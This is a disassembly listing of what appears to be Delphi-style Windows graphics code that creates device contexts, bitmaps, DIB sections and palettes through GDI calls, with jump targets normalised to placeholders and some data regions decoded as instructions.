push ebx
push esi
push edi
mov [ ebp - 0x1 ] cl
mov esi edx
mov ebx eax
lea eax [ ebp - 0x2a ]
xor ecx ecx
mov edx 0x6
call sub_402d24
lea eax [ ebp - 0x54 ]
xor ecx ecx
mov edx 0x10
call sub_402d24
lea eax [ ebp - 0x44 ]
push eax
push esi
call GetIconInfo
call sub_4264b8
xor edx edx
push ebp
push sub_4266b2
push [ fs : edx ]
mov [ fs : edx ] esp
push 0x2
lea ecx [ ebp - 0x10 ]
lea edx [ ebp - 0x8 ]
mov eax [ ebp - 0x38 ]
call sub_426384
push 0x10
lea ecx [ ebp - 0x14 ]
lea edx [ ebp - 0xc ]
mov eax [ ebp - 0x34 ]
call sub_426384
xor eax eax
mov [ ebp - 0x18 ] eax
xor eax eax
mov [ ebp - 0x1c ] eax
xor eax eax
mov [ ebp - 0x20 ] eax
xor eax eax
mov [ ebp - 0x24 ] eax
xor edx edx
push ebp
push sub_42668b
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x8 ]
call sub_407fe4
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x10 ]
call sub_407fe4
mov [ ebp - 0x1c ] eax
mov eax [ ebp - 0xc ]
call sub_407fe4
mov [ ebp - 0x20 ] eax
mov eax [ ebp - 0x14 ]
call sub_407fe4
mov [ ebp - 0x24 ] eax
mov eax [ ebp - 0x1c ]
push eax
push 0x2
mov ecx [ ebp - 0x18 ]
xor edx edx
mov eax [ ebp - 0x38 ]
call sub_4263f0
mov eax [ ebp - 0x24 ]
push eax
push 0x10
mov ecx [ ebp - 0x20 ]
xor edx edx
mov eax [ ebp - 0x34 ]
call sub_4263f0
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov [ ebp - 0x28 ] 0x1
mov [ ebp - 0x26 ] 0x1
lea edx [ ebp - 0x2a ]
mov ecx 0x6
mov eax ebx
mov esi [ eax ]
call [ esi + 0x10 ]
mov esi [ ebp - 0x20 ]
mov eax esi
mov dl [ eax + 0x4 ]
mov [ ebp - 0x54 ] dl
mov dl [ eax + 0x8 ]
mov [ ebp - 0x53 ] dl
mov dx [ eax + 0xc ]
imul dx [ eax + 0xe ]
mov [ ebp - 0x52 ] dx
mov eax [ ebp - 0xc ]
add eax [ ebp - 0x14 ]
add eax [ ebp - 0x10 ]
mov [ ebp - 0x4c ] eax
mov [ ebp - 0x48 ] 0x16
lea edx [ ebp - 0x54 ]
mov ecx 0x10
mov eax ebx
mov edi [ eax ]
call [ edi + 0x10 ]
mov eax esi
mov edx [ eax + 0x8 ]
add [ eax + 0x8 ] edx
mov edx [ ebp - 0x20 ]
mov ecx [ ebp - 0xc ]
mov eax ebx
mov esi [ eax ]
call [ esi + 0x10 ]
mov edx [ ebp - 0x24 ]
mov ecx [ ebp - 0x14 ]
mov eax ebx
mov esi [ eax ]
call [ esi + 0x10 ]
mov edx [ ebp - 0x1c ]
mov ecx [ ebp - 0x10 ]
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x10 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_426692
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x20 ]
call sub_40270c
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0x24 ]
call sub_40270c
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x18 ]
call sub_40270c
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0x1c ]
call sub_40270c
retn
mov eax [ ebp - 0xc ]
add eax 0x16
add eax [ ebp - 0x14 ]
add eax [ ebp - 0x10 ]
mov [ ebp - 0x30 ] eax
lea edx [ ebp - 0x30 ]
mov ecx 0x4
mov eax ebx
mov esi [ eax ]
call [ esi + 0x10 ]
sub_426692
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4266b9
mov eax [ ebp - 0x34 ]
push eax
call DeleteObject
mov eax [ ebp - 0x38 ]
push eax
call DeleteObject
retn
sub_4266c0
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_403338
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4036b4
mov eax esi
pop esi
pop ebx
retn
call sub_40370c
pop [ fs : 0x0 ]
add esp 0xc
sub_426710
push ebp
mov ebp esp
push ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0x20 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edx [ eax ]
call [ edx + 0x1c ]
xor al 0x1
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ebx [ eax + 0x20 ]
mov eax ebx
mov edx [ r-xdata ]
call sub_4034f4
test al al
je r-xdata
mov al 0x1
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov edx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
test al al
je r-xdata
xor eax eax
jmp r-xdata
pop ebx
pop ebp
retn
sub_426768
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ eax ]
mov eax [ eax + 0x30 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ eax ]
mov eax [ eax + 0x44 ]
push eax
push ebp
call sub_426710
pop ecx
mov ecx eax
mov edx r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x8 ]
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_4267b1
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
add esp 0xfffffff4
push ebx
push esi
push edi
mov esi edx
mov ebx eax
test esi esi
je r-xdata
xor eax eax
jmp r-xdata
mov eax ebx
call sub_4032b0
mov edi eax
mov eax esi
call sub_4032b0
cmp edi eax
je r-xdata
mov [ ebp - 0x1 ] al
mov eax ebx
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
jne r-xdata
mov al 0x1
mov eax ebx
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
je r-xdata
xor eax eax
jmp r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x1c ]
test al al
jne r-xdata
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov [ ebp - 0x1 ] al
jmp r-xdata
mov al 0x1
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_403338
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_4268eb
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x8 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_403338
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_4268ce
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0xc ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx ]
push edx
push eax
mov eax [ ebp - 0xc ]
mov edx [ eax ]
call [ edx ]
cmp edx [ esp + 0x4 ]
jne r-xdata
pop edx
pop eax
jne r-xdata
cmp eax [ esp ]
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx ]
mov ecx eax
mov eax [ ebp - 0xc ]
mov edx [ eax + 0x4 ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
call sub_408110
test al al
jne r-xdata
mov [ ebp - 0x1 ] al
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4268d5
mov al 0x1
sub_426904
push ebp
mov ebp esp
push ecx
push esi
mov esi eax
push 0x20
mov ecx edx
mov eax [ r-xdata ]
mov dl 0x1
call sub_41b1cc
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_42694c
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x4 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x54 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_426953
mov eax [ ebp - 0x4 ]
call sub_403368
retn
sub_426958
push ebp
mov ebp esp
push ebx
cmp [ eax + 0x1a ] 0x0
je r-xdata
pop ebx
pop ebp
retn 0x10
mov bl [ ebp + 0x14 ]
push ebx
mov bl [ ebp + 0x10 ]
push ebx
mov ebx [ ebp + 0xc ]
push ebx
mov ebx [ ebp + 0x8 ]
push ebx
mov ebx eax
mov eax [ ebx + 0x1c ]
call [ ebx + 0x18 ]
sub_42698c
push ebp
mov ebp esp
push ecx
push esi
mov esi eax
push 0xffff
mov ecx edx
mov eax [ r-xdata ]
mov dl 0x1
call sub_41b1cc
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_4269d7
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x4 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x58 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4269de
mov eax [ ebp - 0x4 ]
call sub_403368
retn
sub_426a08
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
jl r-xdata
imul esi [ ebp + ebp * 2 + 0x61 ] 0x6e614370
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x6a ] ch
inc edx
add [ eax + eax ] ah
add [ eax ] al
das
inc edx
add [ eax - 0x5bffbfcb ] bl
xor eax 0x35a80040
inc eax
add [ ebp + esi + 0x35a00040 ] ch
inc eax
add [ eax ] al
xor eax [ eax ]
sbb al 0x33
inc eax
add [ esp + ebp * 2 ] al
inc edx
add [ eax - 0x5fffbe71 ] bl
pop [ ecx ]
mov ah 0x8e
inc ecx
add al cl
push edx
inc edx
add [ edx + edx * 2 + 0x6cd00042 ] dh
inc edx
add [ 0x74694254 ] cl
insd
popad
jo r-xdata
rcl [ ebp + 0x68 ] 0x16
imul eax [ edx ] 0x64
push [ eax ]
jae r-xdata
rcl [ ebp + 0x68 ] 0x3e
imul eax [ edx ] 0x64
push [ eax ]
popad
outsb
jbe r-xdata
inc ebp
hlt
push 0x42
add [ edi + ebp + 0x42 ] ch
add [ eax + eax ] al
or [ edi + 0x72 ] al
popad
jo r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_426b45
mov eax [ rw-data ]
call sub_418cc8
retn
mov [ ebp - 0x4 ] eax
call sub_4188a0
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0xc ]
call sub_425008
test al al
je r-xdata
jae r-xdata
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
call sub_425064
retn
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
dec eax
cmp eax 0x0
jl r-xdata
imul esp [ ebx + 0x73 ] 0x8b550000
in al dx
add esp 0xfffffff4
mov eax [ rw-data ]
call sub_418c64
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_426b3e
push [ fs : eax ]
dec [ ebp - 0x4 ]
cmp [ ebp - 0x4 ] 0xffffffff
jne r-xdata
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
call sub_426c30
xor eax eax
pop edx
xor eax eax
push ebp
push sub_426b16
push [ fs : eax ]
pop esi
retn
sar [ edx + ebp * 2 + 0x42 ] 0x0
pop es
or eax 0x74694254
insd
popad
jo r-xdata
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
clc
add [ ecx + ebx * 2 - 0x77 ] bh
inc ebp
cld
jbe r-xdata
popad
outsb
sub_426aa0
push ebp
mov ebp esp
add esp 0xfffffff4
mov eax [ rw-data ]
call sub_418c64
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_426b3e
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
dec eax
cmp eax 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_426b45
mov eax [ rw-data ]
call sub_418cc8
retn
mov [ ebp - 0x4 ] eax
dec [ ebp - 0x4 ]
cmp [ ebp - 0x4 ] 0xffffffff
jne r-xdata
xor eax eax
push ebp
push sub_426b16
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
call sub_426c30
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
call sub_425064
retn
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call sub_4188a0
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0xc ]
call sub_425008
test al al
je r-xdata
sub_426b4c
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ rw-data ]
call sub_418c64
mov esi eax
xor ecx ecx
push ebp
push sub_426bbc
push [ fs : ecx ]
mov [ fs : ecx ] esp
mov ebx [ esi + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ rw-data ]
call sub_418cc8
retn
mov edx ebx
mov eax esi
call sub_4188a0
mov edx [ eax + 0x58 ]
test edx edx
je r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx [ edx + 0x28 ]
mov edx [ edx + 0x8 ]
cmp edx [ ebp - 0x4 ]
jne r-xdata
call sub_426c30
sub_426bc8
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_424af4
mov [ edi + 0x58 ] esi
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4036b4
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_40370c
pop [ fs : 0x0 ]
add esp 0xc
sub_426c04
push ebx
push esi
call sub_40371c
mov ebx edx
mov esi eax
mov eax esi
call sub_426c30
mov edx ebx
and dl 0xfc
mov eax esi
call sub_424bb8
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403704
sub_426c30
push ebp
mov ebp esp
push ecx
push ebx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_424df8
xor edx edx
push ebp
push sub_426cc4
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x5c ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x60 ]
test eax eax
je r-xdata
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call SelectObject
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x4 ]
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_4251ec
push ebx
call DeleteDC
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_418c78
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_425064
retn
push 0xffffffff
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
push eax
call SelectPalette
sub_426cd0
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x58 ] 0x0
je r-xdata
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_424df8
xor eax eax
push ebp
push sub_426daf
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x58 ]
call sub_427fec
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x58 ]
mov eax [ eax + 0x28 ]
mov eax [ eax + 0x8 ]
call sub_426b4c
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x58 ]
call sub_4280ec
push 0x0
call CreateCompatibleDC
mov ebx eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x58 ]
mov eax [ eax + 0x28 ]
mov esi [ eax + 0x8 ]
test esi esi
je r-xdata
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x5c ] edx
push esi
push ebx
call SelectObject
mov edx [ ebp - 0x4 ]
mov [ edx + 0x5c ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x60 ] edx
push 0xffffffff
push esi
push ebx
call SelectPalette
mov edx [ ebp - 0x4 ]
mov [ edx + 0x60 ] eax
push ebx
call RealizePalette
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x58 ]
mov eax [ eax + 0x28 ]
mov esi [ eax + 0x10 ]
test esi esi
je r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_4251ec
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_418bdc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_425064
retn
sub_426dc0
push ebx
mov ebx eax
test ebx ebx
je r-xdata
pop ebx
retn
dec [ ebx + 0x4 ]
cmp [ ebx + 0x4 ] 0x0
jne r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx ]
mov eax ebx
call sub_403368
sub_426de0
push ebx
push esi
call sub_40371c
mov ebx edx
mov esi eax
mov eax [ esi + 0x14 ]
test eax eax
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx ]
mov eax [ esi + 0x64 ]
test eax eax
je r-xdata
call sub_426b4c
mov eax [ esi + 0x14 ]
push eax
call DeleteObject
xor eax eax
mov [ esi + 0x14 ] eax
lea eax [ esi + 0x6c ]
call sub_40d490
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403358
test bl bl
jle r-xdata
push eax
call CloseHandle
pop esi
pop ebx
retn
mov eax esi
call sub_403704
sub_426e3c
push ebx
mov ebx eax
mov eax [ ebx + 0x8 ]
test eax eax
je r-xdata
mov eax [ ebx + 0xc ]
test eax eax
je r-xdata
cmp eax [ ebx + 0x14 ]
je r-xdata
mov eax [ ebx + 0x10 ]
call sub_423448
xor eax eax
mov [ ebx + 0x8 ] eax
xor eax eax
mov [ ebx + 0x10 ] eax
pop ebx
retn
call sub_426b4c
mov eax [ ebx + 0xc ]
push eax
call DeleteObject
xor eax eax
mov [ ebx + 0xc ] eax
call sub_426b4c
mov eax [ ebx + 0x8 ]
push eax
call DeleteObject
sub_426e88
push ebp
mov ebp esp
add esp 0xfffffbf0
push ebx
push esi
mov [ ebp - 0x4 ] edx
mov esi eax
test esi esi
je r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp [ ecx + 0x26 ] 0x8
ja r-xdata
lea edx [ ebp - 0x410 ]
mov ecx 0xff
mov eax [ ebp - 0x4 ]
call sub_425cec
mov ebx eax
test ebx ebx
je r-xdata
push 0x0
call GetDC
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
push eax
call CreateCompatibleDC
mov [ ebp - 0xc ] eax
push esi
mov eax [ ebp - 0xc ]
push eax
call SelectObject
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_426f37
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x410 ]
push eax
push ebx
push 0x0
mov eax [ ebp - 0xc ]
push eax
call SetDIBColorTable
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x10 ]
push eax
mov eax [ ebp - 0xc ]
push eax
call SelectObject
mov eax [ ebp - 0xc ]
push eax
call DeleteDC
mov eax [ ebp - 0x8 ]
push eax
push 0x0
call ReleaseDC
retn
sub_426f44
test [ eax + 0x28 ] 0x3
je r-xdata
retn
cmp [ eax + 0x40 ] 0x0
jne r-xdata
mov dx [ eax + 0x26 ]
cmp dx 0x10
jne r-xdata
cmp dx 0x20
jne r-xdata
mov [ eax + 0x40 ] 0xf800
mov [ eax + 0x44 ] 0x7e0
mov [ eax + 0x48 ] 0x1f
jmp r-xdata
mov [ eax + 0x40 ] 0xff0000
mov [ eax + 0x44 ] 0xff00
mov [ eax + 0x48 ] 0xff
sub_426f90
push ebp
mov ebp esp
add esp 0xffffff68
push ebx
push esi
push edi
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
mov [ ebp - 0x10 ] eax
mov eax [ ebp + 0xc ]
cmp [ eax + 0x18 ] 0x0
je r-xdata
mov eax [ ebp + 0xc ]
cmp [ eax + 0x18 ] 0x0
jne r-xdata
mov eax [ ebp + 0xc ]
cmp [ eax + 0x1c ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_426b4c
xor eax eax
mov [ ebp - 0x70 ] eax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax [ ebp + 0xc ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov eax [ ebp - 0x10 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov eax [ ebp + 0xc ]
cmp [ eax + 0x20 ] 0x0
je r-xdata
push 0x0
call GetDC
call sub_425558
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x18 ]
push eax
call CreateCompatibleDC
call sub_425558
mov [ ebp - 0x1c ] eax
xor edx edx
push ebp
push sub_4275de
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp + 0xc ]
cmp [ eax + 0x18 ] 0x28
jae r-xdata
lea eax [ ebp - 0x88 ]
push eax
push 0x54
mov eax [ ebp - 0x4 ]
push eax
call GetObjectA
cmp eax 0x18
jge r-xdata
mov eax [ ebp + 0xc ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
mov eax 0x42c
call sub_4026ec
mov [ ebp - 0x24 ] eax
xor edx edx
push ebp
push sub_4272e8
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp + 0xc ]
mov [ eax + 0x18 ] 0x28
mov eax [ ebp + 0xc ]
mov [ eax + 0x24 ] 0x1
mov eax [ ebp + 0xc ]
cmp [ eax + 0x26 ] 0x0
jne r-xdata
mov eax [ ebp + 0xc ]
mov ax [ eax + 0x10 ]
mov edx [ ebp + 0xc ]
or ax [ edx + 0x12 ]
cmp ax 0x1
jne r-xdata
call sub_425444
mov eax [ ebp + 0xc ]
mov edx [ ebp - 0x24 ]
lea esi [ eax + 0x18 ]
mov edi edx
mov ecx 0xa
[ edi ] [ esi ]
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x1c ]
mov edx [ ebp + 0xc ]
mov [ edx + 0x4 ] eax
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x20 ]
mov edx [ ebp + 0xc ]
mov [ edx + 0x8 ] eax
mov eax [ ebp + 0xc ]
cmp [ eax + 0x26 ] 0x8
ja r-xdata
push 0xc
mov eax [ ebp - 0x18 ]
push eax
call GetDeviceCaps
mov ebx eax
push 0xe
mov eax [ ebp - 0x18 ]
push eax
call GetDeviceCaps
imul bx ax
mov eax [ ebp + 0xc ]
mov [ eax + 0x26 ] bx
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x4 ]
push eax
mov eax [ ebp - 0x18 ]
push eax
call CreateCompatibleBitmap
call sub_425558
mov [ ebp - 0x10 ] eax
jmp r-xdata
push 0x0
push 0x1
push 0x1
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x4 ]
push eax
call CreateBitmap
call sub_425558
mov [ ebp - 0x10 ] eax
jmp r-xdata
mov eax [ ebp + 0xc ]
mov ax [ eax + 0x26 ]
cmp ax 0x10
je r-xdata
mov eax [ ebp + 0xc ]
cmp [ eax + 0x26 ] 0x1
jne r-xdata
mov eax [ ebp - 0x10 ]
call sub_425558
mov eax [ ebp - 0x10 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call SelectObject
call sub_425558
mov [ ebp - 0x14 ] eax
xor eax eax
push ebp
push sub_42758f
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
push ebp
push sub_42757e
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
mov [ ebp - 0x34 ] eax
xor ebx ebx
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov eax [ ebp + 0xc ]
test [ eax + 0x28 ] 0x3
je r-xdata
mov edx [ ebp + 0xc ]
cmp ax 0x20
jne r-xdata
cmp [ ebp - 0xc ] 0x0
je r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
xor eax eax
push ebp
push sub_42755c
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp + 0x8 ] 0x0
je r-xdata
push 0x0
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call SelectPalette
mov [ ebp - 0x34 ] eax
mov eax [ ebp - 0x1c ]
push eax
call RealizePalette
push 0x0
push 0x0
lea eax [ ebp - 0x28 ]
push eax
push 0x0
mov eax [ ebp - 0x24 ]
push eax
mov eax [ ebp - 0x18 ]
push eax
call CreateDIBSection
call sub_425558
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x28 ] 0x0
jne r-xdata
mov eax [ ebp + 0xc ]
call sub_426f44
mov eax [ ebp - 0x24 ]
lea edx [ eax + 0x28 ]
mov eax [ ebp + 0xc ]
add eax 0x40
mov ecx 0xc
call sub_4028e8
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax [ ebp - 0x24 ]
lea edx [ eax + 0x28 ]
mov ecx 0xff
mov eax [ ebp - 0xc ]
call sub_425cec
jmp r-xdata
mov eax [ ebp - 0x24 ]
xor edx edx
mov [ eax + 0x28 ] edx
mov eax [ ebp - 0x24 ]
add eax 0x28
add eax 0x4
mov [ eax ] 0xffffff
jmp r-xdata
cmp [ ebp - 0x74 ] 0x0
jne r-xdata
push 0xff0062
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x4 ]
push eax
push 0x0
push 0x0
mov eax [ ebp - 0x1c ]
push eax
call PatBlt
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x14 ]
call sub_4249d8
push eax
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x8 ]
push eax
lea eax [ ebp - 0x98 ]
push eax
mov ecx [ ebp + 0xc ]
mov ecx [ ecx + 0x4 ]
xor edx edx
xor eax eax
call sub_417264
lea eax [ ebp - 0x98 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call FillRect
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0xc ]
mov eax [ eax + 0x18 ]
call sub_423d18
push eax
mov eax [ ebp - 0x1c ]
push eax
call SetTextColor
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x14 ]
call sub_42499c
call sub_423d18
push eax
mov eax [ ebp - 0x1c ]
push eax
call SetBkColor
mov eax [ ebp + 0xc ]
cmp [ eax + 0x26 ] 0x1
jne r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
call sub_4254b0
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call SelectObject
mov [ ebp - 0x14 ] eax
cmp [ ebp - 0x70 ] 0x0
jbe r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_427563
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov eax [ ebp - 0x18 ]
push eax
call CreateCompatibleDC
call sub_425558
mov [ ebp - 0x20 ] eax
xor eax eax
push ebp
push sub_427532
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x20 ]
push eax
call SelectObject
call sub_425558
mov esi eax
cmp [ ebp - 0x8 ] 0x0
je r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax [ ebp + 0xc ]
cmp [ eax + 0x14 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x24 ]
call sub_40270c
retn
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x1c ]
cmp eax [ ebp - 0x84 ]
jne r-xdata
push 0x0
mov eax [ ebp - 0x24 ]
push eax
push 0x0
mov eax [ ebp + 0xc ]
mov eax [ eax + 0x20 ]
cdq
xor eax edx
sub eax edx
push eax
push 0x0
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call GetDIBits
cmp [ ebp - 0x74 ] 0x0
je r-xdata
retn
push 0xffffffff
mov eax [ ebp - 0x34 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call SelectPalette
cmp [ ebp + 0x8 ] 0x0
je r-xdata
push 0x0
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x20 ]
push eax
call SelectPalette
mov ebx eax
mov eax [ ebp - 0x20 ]
push eax
call RealizePalette
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0xc ]
mov eax [ eax + 0x18 ]
call sub_423d18
mov [ ebp - 0x30 ] eax
